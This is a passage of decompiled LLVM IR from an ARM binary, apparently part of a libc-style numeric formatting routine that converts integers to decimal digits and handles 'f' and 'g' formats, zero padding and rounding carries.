  store i32 ptrtoint ([4 x i8]* @global_var_1a23c.564 to i32), i32* %r2.global-to-local, align 4
  %v2_14384 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_14384, i32* %r6.global-to-local, align 4
  %v2_14388 = add i32 %v4_14378..v1_14308, ptrtoint ([4 x i8]* @global_var_1a23c.564 to i32)
  store i32 %v2_14388, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1480c

.thread10:                                        ; preds = %dec_label_pc_142e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_14410 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_14410, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %dec_label_pc_14488, %.thread10
  %v3_1442c = phi i32 [ %v2_14478, %dec_label_pc_14488 ], [ %v3_14284, %.thread10 ]
  %v1_1442c = phi i1 [ %v5_1448c, %dec_label_pc_14488 ], [ false, %.thread10 ]
  %v0_1442c = phi i1 [ %v6_1448c, %dec_label_pc_14488 ], [ false, %.thread10 ]
  %v2_1442c = xor i1 %v1_1442c, %v0_1442c
  br i1 %v2_1442c, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_14418
  %v4_1442c = sub i32 0, %v3_1442c
  store i32 %v4_1442c, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_14418, %bb186
  %v0_14430 = phi i32 [ %v3_1442c, %dec_label_pc_14418 ], [ %v4_1442c, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14430 = icmp slt i32 %v0_14430, 0
  store i1 %v1_14430, i1* %cpsr_n.global-to-local, align 1
  %v2_14430 = icmp eq i32 %v0_14430, 0
  store i1 %v2_14430, i1* %cpsr_z.global-to-local, align 1
  %v0_1444c = load i32, i32* %sl.global-to-local, align 4
  %v1_1444c = add i32 %v0_1444c, 9
  store i32 %v1_1444c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14454

dec_label_pc_14454:                               ; preds = %dec_label_pc_14454.dec_label_pc_14454_crit_edge, %bb187
  %v1_14468 = phi i32 [ %v1_14468.pre, %dec_label_pc_14454.dec_label_pc_14454_crit_edge ], [ %v1_1444c, %bb187 ]
  %v0_14460 = phi i32 [ %v0_1447c, %dec_label_pc_14454.dec_label_pc_14454_crit_edge ], [ 0, %bb187 ]
  %v0_1446c = phi i32 [ %v2_14478, %dec_label_pc_14454.dec_label_pc_14454_crit_edge ], [ %v0_14430, %bb187 ]
  %v2_1445c = urem i32 %v0_1446c, 10
  %v1_14460 = add i32 %v0_14460, 1
  store i32 %v1_14460, i32* %r5.global-to-local, align 4
  %v1_14464 = or i32 %v2_1445c, 48
  store i32 %v1_14464, i32* %r2.global-to-local, align 4
  %v2_14468 = sub i32 %v1_14468, %v1_14460
  store i32 %v2_14468, i32* %r3.global-to-local, align 4
  store i32 %v0_1446c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14474 = trunc i32 %v1_14464 to i8
  %v3_14474 = inttoptr i32 %v2_14468 to i8*
  store i8 %v1_14474, i8* %v3_14474, align 1
  %v0_14478 = load i32, i32* %r0.global-to-local, align 4
  %v1_14478 = load i32, i32* %r1.global-to-local, align 4
  %v2_14478 = udiv i32 %v0_14478, %v1_14478
  store i32 %v2_14478, i32* %r0.global-to-local, align 4
  %v0_1447c = load i32, i32* %r5.global-to-local, align 4
  %v1_1447c = add i32 %v0_1447c, -8
  %v3_1447c = sub i32 7, %v0_1447c
  %v4_1447c = and i32 %v3_1447c, %v0_1447c
  %v5_1447c = icmp slt i32 %v4_1447c, 0
  store i1 %v5_1447c, i1* %cpsr_v.global-to-local, align 1
  %v6_1447c = icmp slt i32 %v1_1447c, 0
  store i1 %v6_1447c, i1* %cpsr_n.global-to-local, align 1
  %v7_1447c = icmp eq i32 %v0_1447c, 8
  store i1 %v7_1447c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14478, i32* %r4.global-to-local, align 4
  %v7_14484 = icmp slt i32 %v0_1447c, 9
  br i1 %v7_14484, label %dec_label_pc_14454.dec_label_pc_14454_crit_edge, label %dec_label_pc_14488

dec_label_pc_14454.dec_label_pc_14454_crit_edge:  ; preds = %dec_label_pc_14454
  %v1_14468.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14454

dec_label_pc_14488:                               ; preds = %dec_label_pc_14454
  %v0_14488 = load i32, i32* %r6.global-to-local, align 4
  %v1_14488 = add i32 %v0_14488, 1
  store i32 %v1_14488, i32* %r6.global-to-local, align 4
  %v3_1448c = sub i32 -1, %v0_14488
  %v4_1448c = and i32 %v1_14488, %v3_1448c
  %v5_1448c = icmp slt i32 %v4_1448c, 0
  store i1 %v5_1448c, i1* %cpsr_v.global-to-local, align 1
  %v6_1448c = icmp slt i32 %v0_14488, 0
  store i1 %v6_1448c, i1* %cpsr_n.global-to-local, align 1
  %v7_1448c = icmp eq i32 %v0_14488, 0
  store i1 %v7_1448c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1448c, label %dec_label_pc_14418, label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %dec_label_pc_14488
  %v0_14494 = load i32, i32* %r7.global-to-local, align 4
  %v1_14494 = add i32 %v0_14494, -96
  %v3_14494 = sub i32 95, %v0_14494
  %v4_14494 = and i32 %v3_14494, %v0_14494
  %v5_14494 = icmp slt i32 %v4_14494, 0
  store i1 %v5_14494, i1* %cpsr_v.global-to-local, align 1
  %v6_14494 = icmp slt i32 %v1_14494, 0
  store i1 %v6_14494, i1* %cpsr_n.global-to-local, align 1
  %v7_14494 = icmp eq i32 %v0_14494, 96
  store i1 %v7_14494, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_14494, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_14494
  %v5_144a0 = add i32 %v0_14494, 32
  store i32 %v5_144a0, i32* %r3.global-to-local, align 4
  %v5_144a4 = urem i32 %v5_144a0, 256
  store i32 %v5_144a4, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14494, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_14494 ]
  %v0_144c4 = phi i32 [ %v5_144a4, %bb188 ], [ %v0_14494, %dec_label_pc_14494 ]
  %v7_144a8 = icmp eq i32 %v0_144c4, 103
  %.229 = zext i1 %v7_144a8 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_144b4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_144b4 = icmp slt i32 %v0_144b4, 0
  store i1 %v1_144b4, i1* %cpsr_n.global-to-local, align 1
  %v2_144b4 = icmp eq i32 %v0_144b4, 0
  store i1 %v2_144b4, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_144b4, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_144bc = icmp eq i1 %v7_144a8, false
  store i1 %v2_144bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144bc, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_144c0 = add i32 %v0_144b4, -1
  store i32 %v2_144c0, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_144d0 = phi i32 [ %v0_144b4, %.thread13 ], [ %v0_144b4, %bb192 ], [ %v2_144c0, %bb193 ]
  %v1_144c4 = add i32 %v0_144c4, -102
  %v3_144c4 = sub i32 101, %v0_144c4
  %v4_144c4 = and i32 %v3_144c4, %v0_144c4
  %v5_144c4 = icmp slt i32 %v4_144c4, 0
  store i1 %v5_144c4, i1* %cpsr_v.global-to-local, align 1
  %v6_144c4 = icmp slt i32 %v1_144c4, 0
  store i1 %v6_144c4, i1* %cpsr_n.global-to-local, align 1
  %v7_144c4 = icmp eq i32 %v0_144c4, 102
  store i1 %v7_144c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_144c4, label %dec_label_pc_144d0, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_144d0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144d0:                               ; preds = %bb194
  %v1_144d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_144d0 = add i32 %v1_144d0, %v0_144d0
  store i32 %v2_144d0, i32* %ip.global-to-local, align 4
  %v2_144d4 = add i32 %v2_144d0, 1
  %v4_144d4 = sub i32 0, %v2_144d0
  %v5_144d4 = and i32 %v2_144d4, %v4_144d4
  %v6_144d4 = icmp slt i32 %v5_144d4, 0
  store i1 %v6_144d4, i1* %cpsr_v.global-to-local, align 1
  %v7_144d4 = icmp slt i32 %v2_144d4, 0
  store i1 %v7_144d4, i1* %cpsr_n.global-to-local, align 1
  %v8_144d4 = icmp eq i32 %v2_144d4, 0
  store i1 %v8_144d4, i1* %cpsr_z.global-to-local, align 1
  %v6_144d8 = icmp slt i32 %v2_144d0, -1
  br i1 %v6_144d8, label %dec_label_pc_144dc, label %dec_label_pc_144f4

dec_label_pc_144dc:                               ; preds = %dec_label_pc_144d0
  %v2_144dc = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_144dc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_144e8 = bitcast i32* %stack_var_-87 to i8*
  %v3_144e8 = call i32 @__GI_memset(i8* %v2_144e8, i32 48)
  store i32 %v3_144e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_144d0, %bb195, %dec_label_pc_144dc
  %v1_1453869 = phi i32 [ %v2_14478, %bb195 ], [ %v3_144e8, %dec_label_pc_144dc ], [ %v2_14478, %dec_label_pc_144d0 ]
  %v1_1451c = phi i32 [ %v0_144d0, %bb195 ], [ -1, %dec_label_pc_144dc ], [ %v2_144d0, %dec_label_pc_144d0 ]
  %v1_144f8 = add i32 %v1_1451c, -16
  %v3_144f8 = sub i32 15, %v1_1451c
  %v4_144f8 = and i32 %v3_144f8, %v1_1451c
  %v5_144f8 = icmp slt i32 %v4_144f8, 0
  store i1 %v5_144f8, i1* %cpsr_v.global-to-local, align 1
  %v6_144f8 = icmp slt i32 %v1_144f8, 0
  store i1 %v6_144f8, i1* %cpsr_n.global-to-local, align 1
  %v7_144f8 = icmp eq i32 %v1_1451c, 16
  store i1 %v7_144f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_14504 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_14504, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_1450c = icmp sgt i32 %v1_1451c, 16
  br i1 %v7_1450c, label %.thread18, label %dec_label_pc_14518

.thread18:                                        ; preds = %dec_label_pc_144f4
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_14510 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_14510, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_14518:                               ; preds = %dec_label_pc_144f4
  %v2_14518 = ptrtoint i32* %stack_var_-86 to i32
  %v2_1451c = add i32 %v1_1451c, %v2_14518
  store i32 %v2_1451c, i32* %r3.global-to-local, align 4
  %v1_14520 = add i32 %v2_1451c, 2
  %v2_14520 = inttoptr i32 %v1_14520 to i8*
  %v3_14520 = load i8, i8* %v2_14520, align 1
  %v4_14520 = zext i8 %v3_14520 to i32
  store i32 %v4_14520, i32* %r2.global-to-local, align 4
  store i32 %v1_14520, i32* %r1.global-to-local, align 4
  %v2_14528 = icmp ugt i8 %v3_14520, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14528 = icmp ult i8 %v3_14520, 52
  store i1 %v6_14528, i1* %cpsr_n.global-to-local, align 1
  %v7_14528 = icmp eq i8 %v3_14520, 52
  store i1 %v7_14528, i1* %cpsr_z.global-to-local, align 1
  %v2_1452c = xor i1 %v2_14528, true
  %v3_1452c = or i1 %v7_14528, %v2_1452c
  br i1 %v3_1452c, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_14518
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_14518, %bb196
  %v1_1453868 = phi i32 [ %v1_1453869, %dec_label_pc_14518 ], [ 0, %bb196 ]
  %v2_14530 = xor i1 %v7_14528, true
  %v3_14530 = and i1 %v2_14528, %v2_14530
  br i1 %v3_14530, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_14538 = phi i32 [ %v1_14538.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1453868, %bb197 ], [ 1, %bb198 ]
  %v0_14534 = phi i32 [ %v0_14540, %.backedge ], [ %v10_14510, %.thread18 ], [ %v1_14520, %bb197 ], [ %v1_14520, %bb198 ]
  %v1_14534 = add i32 %v0_14534, -1
  %v2_14534 = inttoptr i32 %v1_14534 to i8*
  %v3_14534 = load i8, i8* %v2_14534, align 1
  %v4_14534 = zext i8 %v3_14534 to i32
  store i32 %v1_14534, i32* %r1.global-to-local, align 4
  %v2_14538 = add i32 %v4_14534, %v1_14538
  store i32 %v2_14538, i32* %r3.global-to-local, align 4
  %v1_1453c = trunc i32 %v2_14538 to i8
  store i8 %v1_1453c, i8* %v2_14534, align 1
  %v0_14540 = load i32, i32* %r1.global-to-local, align 4
  %v1_14540 = inttoptr i32 %v0_14540 to i8*
  %v2_14540 = load i8, i8* %v1_14540, align 1
  %v3_14540 = zext i8 %v2_14540 to i32
  store i32 %v3_14540, i32* %r2.global-to-local, align 4
  %v2_14544 = icmp ugt i8 %v2_14540, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14544 = icmp ult i8 %v2_14540, 57
  store i1 %v6_14544, i1* %cpsr_n.global-to-local, align 1
  %v7_14544 = icmp eq i8 %v2_14540, 57
  store i1 %v7_14544, i1* %cpsr_z.global-to-local, align 1
  %v2_14548 = xor i1 %v2_14544, true
  %v3_14548 = or i1 %v7_14544, %v2_14548
  br i1 %v3_14548, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_1454c = xor i1 %v7_14544, true
  %v3_1454c = and i1 %v2_14544, %v2_1454c
  br i1 %v3_1454c, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_14554.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_14554 = phi i32 [ %v1_14554.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14550 = icmp ult i8 %v2_14540, 48
  store i1 %v6_14550, i1* %cpsr_n.global-to-local, align 1
  %v7_14550 = icmp eq i8 %v2_14540, 48
  store i1 %v7_14550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14550, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_14554 = or i32 %v1_14554, 1
  store i32 %v2_14554, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1455821 = icmp slt i32 %v2_14554, 0
  store i1 %v1_1455821, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14558 = icmp slt i32 %v1_14554, 0
  store i1 %v1_14558, i1* %cpsr_n.global-to-local, align 1
  %v2_14558 = icmp eq i32 %v1_14554, 0
  store i1 %v2_14558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14558, label %dec_label_pc_14560, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_14538.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_14560:                               ; preds = %bb203
  store i32 %v2_14504, i32* %r2.global-to-local, align 4
  %v2_14564 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_14564, i32* %r3.global-to-local, align 4
  %v2_14568 = sub i32 %v0_14540, %v2_14564
  %v3_14568 = icmp uge i32 %v0_14540, %v2_14564
  %v4_14568 = xor i32 %v0_14540, %v2_14564
  %v5_14568 = xor i32 %v2_14568, %v0_14540
  %v6_14568 = and i32 %v5_14568, %v4_14568
  %v7_14568 = icmp slt i32 %v6_14568, 0
  store i1 %v7_14568, i1* %cpsr_v.global-to-local, align 1
  %v8_14568 = icmp slt i32 %v2_14568, 0
  store i1 %v8_14568, i1* %cpsr_n.global-to-local, align 1
  %v9_14568 = icmp eq i32 %v0_14540, %v2_14564
  store i1 %v9_14568, i1* %cpsr_z.global-to-local, align 1
  %v2_1456c = xor i1 %v3_14568, true
  %v3_1456c = or i1 %v9_14568, %v2_1456c
  br i1 %v3_1456c, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_14560
  store i32 %v2_14564, i32* %r2.global-to-local, align 4
  store i32 %v2_14564, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_14560, %bb204
  %v2_14588 = phi i32 [ %v2_14564, %bb204 ], [ %v0_14540, %dec_label_pc_14560 ]
  %v4_14578123 = phi i32 [ %v2_14564, %bb204 ], [ %v2_14504, %dec_label_pc_14560 ]
  %v2_14574 = xor i1 %v9_14568, true
  %v3_14574 = and i1 %v3_14568, %v2_14574
  br i1 %v3_14574, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_14574 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_14574, i32* %r0.global-to-local, align 4
  %v5_14578 = add i32 %v4_14578123, 2
  store i32 %v5_14578, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_1456c, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_1457c = load i32, i32* %sb.global-to-local, align 4
  %v5_1457c = add i32 %v4_1457c, 1
  store i32 %v5_1457c, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14584 = load i32, i32* %r7.global-to-local, align 4
  %v1_14584 = add i32 %v0_14584, -103
  %v3_14584 = sub i32 102, %v0_14584
  %v4_14584 = and i32 %v3_14584, %v0_14584
  %v5_14584 = icmp slt i32 %v4_14584, 0
  store i1 %v5_14584, i1* %cpsr_v.global-to-local, align 1
  %v6_14584 = icmp slt i32 %v1_14584, 0
  store i1 %v6_14584, i1* %cpsr_n.global-to-local, align 1
  %v7_14584 = icmp eq i32 %v0_14584, 103
  store i1 %v7_14584, i1* %cpsr_z.global-to-local, align 1
  %v3_14588 = add i32 %v2_14588, 1
  %v4_14588 = inttoptr i32 %v3_14588 to i8*
  store i8 0, i8* %v4_14588, align 1
  %v0_1458c = load i32, i32* %r1.global-to-local, align 4
  %v1_1458c = add i32 %v0_1458c, 1
  store i32 %v1_1458c, i32* %r1.global-to-local, align 4
  %v0_14590 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14590, label %bb208, label %dec_label_pc_145c0

bb208:                                            ; preds = %bb207
  %v0_14594 = load i32, i32* %r0.global-to-local, align 4
  %v1_14594 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_14598 = icmp sge i32 %v1_14594, %v0_14594
  %. = zext i1 %not.v7_14598 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_145a0 = add i32 %v0_14594, 4
  %v4_145a0 = sub i32 0, %v0_14594
  %v5_145a0 = and i32 %v2_145a0, %v4_145a0
  %v6_145a0 = icmp slt i32 %v5_145a0, 0
  store i1 %v6_145a0, i1* %cpsr_v.global-to-local, align 1
  %v7_145a0 = icmp slt i32 %v2_145a0, 0
  store i1 %v7_145a0, i1* %cpsr_n.global-to-local, align 1
  %v8_145a0 = icmp eq i32 %v2_145a0, 0
  store i1 %v8_145a0, i1* %cpsr_z.global-to-local, align 1
  %v5_145a4 = icmp slt i32 %v0_14594, -4
  br i1 %v5_145a4, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_145a8 = icmp eq i1 %not.v7_14598, false
  store i1 %v2_145a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_145a8, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_145ac29 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_145ac29, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_145cc

bb210:                                            ; preds = %bb209
  %v3_145b0 = sub i32 %v1_14594, %v0_14594
  store i32 %v3_145b0, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145c0:                               ; preds = %bb207
  %v0_145c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_145c0 = add i32 %v0_145c0, -102
  %v3_145c0 = sub i32 101, %v0_145c0
  %v4_145c0 = and i32 %v3_145c0, %v0_145c0
  %v5_145c0 = icmp slt i32 %v4_145c0, 0
  store i1 %v5_145c0, i1* %cpsr_v.global-to-local, align 1
  %v6_145c0 = icmp slt i32 %v1_145c0, 0
  store i1 %v6_145c0, i1* %cpsr_n.global-to-local, align 1
  %v7_145c0 = icmp eq i32 %v0_145c0, 102
  store i1 %v7_145c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_145c0, i32* %sl.global-to-local, align 4
  br i1 %v7_145c0, label %dec_label_pc_145c0.dec_label_pc_145d8_crit_edge, label %dec_label_pc_145cc

dec_label_pc_145c0.dec_label_pc_145d8_crit_edge:  ; preds = %dec_label_pc_145c0
  %v0_145d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145cc:                               ; preds = %.thread, %dec_label_pc_145c0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_145e8

dec_label_pc_145d8:                               ; preds = %bb210, %dec_label_pc_145c0.dec_label_pc_145d8_crit_edge
  %v0_145d8 = phi i32 [ %v0_145d8.pre, %dec_label_pc_145c0.dec_label_pc_145d8_crit_edge ], [ %v0_14594, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_145d8 = icmp slt i32 %v0_145d8, 0
  store i1 %v1_145d8, i1* %cpsr_n.global-to-local, align 1
  %v2_145d8 = icmp eq i32 %v0_145d8, 0
  store i1 %v2_145d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_145d8, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_145d8
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_145e0 = load i32, i32* %r2.global-to-local, align 4
  %v6_145e0 = add i32 %v5_145e0, -1
  %v7_145e0 = inttoptr i32 %v6_145e0 to i8*
  store i8 48, i8* %v7_145e0, align 1
  %v8_145e0 = load i32, i32* %r2.global-to-local, align 4
  %v9_145e0 = add i32 %v8_145e0, -1
  store i32 %v9_145e0, i32* %r2.global-to-local, align 4
  %v0_145e4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14614.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_14618.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14618.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_145d8, %bb211
  %v1_14618.pre = phi i1 [ %v1_14618.pre.pre, %bb211 ], [ false, %dec_label_pc_145d8 ]
  %v0_14618.pre = phi i1 [ %v0_14618.pre.pre, %bb211 ], [ false, %dec_label_pc_145d8 ]
  %v1_14614.pre = phi i32 [ %v1_14614.pre.pre, %bb211 ], [ %v1_1458c, %dec_label_pc_145d8 ]
  %v0_145e4 = phi i32 [ %v0_145e4.pre, %bb211 ], [ %v0_145d8, %dec_label_pc_145d8 ]
  store i32 %v0_145e4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145cc, %bb212
  %v0_146b8 = phi i32 [ 0, %dec_label_pc_145cc ], [ %v0_145e4, %bb212 ]
  %v1_1461c = phi i1 [ false, %dec_label_pc_145cc ], [ %v1_14618.pre, %bb212 ]
  %v0_1461c = phi i1 [ false, %dec_label_pc_145cc ], [ %v0_14618.pre, %bb212 ]
  %v1_14614 = phi i32 [ %v1_1458c, %dec_label_pc_145cc ], [ %v1_14614.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_145f4 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_145f4, i32* %r3.global-to-local, align 4
  %v0_14600 = load i32, i32* %r2.global-to-local, align 4
  %v1_14600 = inttoptr i32 %v0_14600 to i8*
  %v2_14600 = load i8, i8* %v1_14600, align 1
  %v3_14600 = zext i8 %v2_14600 to i32
  store i32 %v3_14600, i32* %r3.global-to-local, align 4
  %v5_14600 = add i32 %v0_14600, 1
  store i32 %v5_14600, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_14600, i32* %stack_var_-46, align 4
  %v2_14614 = sub i32 %v1_14614, %v5_14600
  store i32 %v2_14614, i32* %r1.global-to-local, align 4
  %v2_14618 = xor i1 %v1_1461c, %v0_1461c
  br i1 %v2_14618, label %.thread127, label %dec_label_pc_14620

.thread127:                                       ; preds = %dec_label_pc_145e8
  %v5_14618 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_14618, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_146c8

dec_label_pc_14620:                               ; preds = %dec_label_pc_145e8
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_14624 = sub i32 %v0_146b8, %v2_14614
  %v4_14624 = xor i32 %v2_14614, %v0_146b8
  %v5_14624 = xor i32 %v2_14624, %v0_146b8
  %v6_14624 = and i32 %v5_14624, %v4_14624
  %v7_14624 = icmp slt i32 %v6_14624, 0
  store i1 %v7_14624, i1* %cpsr_v.global-to-local, align 1
  %v8_14624 = icmp slt i32 %v2_14624, 0
  store i1 %v8_14624, i1* %cpsr_n.global-to-local, align 1
  %v9_14624 = icmp eq i32 %v0_146b8, %v2_14614
  store i1 %v9_14624, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_14630 = xor i1 %v8_14624, %v7_14624
  br i1 %v2_14630, label %bb214, label %dec_label_pc_14634

dec_label_pc_14634:                               ; preds = %dec_label_pc_14620
  store i32 %v2_14624, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_14624, i1* %cpsr_n.global-to-local, align 1
  %v2_14638 = icmp eq i32 %v2_14624, 0
  store i1 %v2_14638, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14298, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_14624, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_1464c

.thread129:                                       ; preds = %dec_label_pc_14634
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_146c4

dec_label_pc_1464c:                               ; preds = %dec_label_pc_14634
  store i32 ptrtoint (i32* @global_var_1a23f.568 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14658 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_14658, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_146c8

bb214:                                            ; preds = %dec_label_pc_14620
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_146a4 = icmp slt i32 %v0_146b8, 0
  store i1 %v1_146a4, i1* %cpsr_n.global-to-local, align 1
  %v2_146a4 = icmp eq i32 %v0_146b8, 0
  store i1 %v2_146a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14298, i32* %lr.global-to-local, align 4
